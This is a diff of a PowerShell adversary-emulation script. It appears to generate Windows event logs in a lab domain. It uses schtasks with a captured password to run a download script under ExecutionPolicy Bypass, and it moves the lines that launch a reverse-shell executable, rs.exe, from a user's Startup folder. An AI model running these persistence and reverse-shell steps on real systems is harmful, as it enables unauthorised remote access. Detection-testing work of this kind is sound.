@@ -1221,9 +1221,6 @@ Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserNa
 Write-Output "`n[+] Creating a scheduled task to run DownloadStartup.ps1 as `$UserName..."
 schtasks /create /tn "RunDownload" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Temp\DownloadStartup.ps1 -DownloadUrl `$DownloadUrl -ExeName `$ExeName" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
 schtasks /run /tn "RunDownload"
-schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
-schtasks /run /tn "RunReverseShell"
-
 
 Write-Output "`n[+] Done. There should be Event Log for a Type 2 logon, and the exe file should be placed in candice.kevin's Startup folder."
 "@
@@ -1341,8 +1338,15 @@ if (!`$logonOk) {
 }
 
 Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserName."
+Write-Output "`n[+] There should be Event Log for a Type 2 logon for `$UserName."
 
-Write-Output "`n[+] Done. There should be Event Log for a Type 2 logon for `$UserName."
+Write-Output "[+] Emulating RS running under candice..."
+schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
+schtasks /run /tn "RunReverseShell"
+
+Write-Output "`n[+] There should be 4688 events for rs.exe."
+
+
 "@
 
 
